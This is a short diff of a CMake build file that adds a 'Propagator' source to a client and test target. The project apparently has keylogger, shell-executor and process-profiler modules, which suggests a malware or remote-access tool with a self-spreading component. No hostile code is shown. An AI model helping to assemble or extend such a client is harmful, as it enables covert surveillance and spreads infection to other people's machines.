@@ -83,6 +83,7 @@ add_executable(inferno_client
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
+    client/src/Propagator.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -124,6 +125,7 @@ add_executable(inferno_tests
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
+    client/src/Propagator.cpp
 )
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
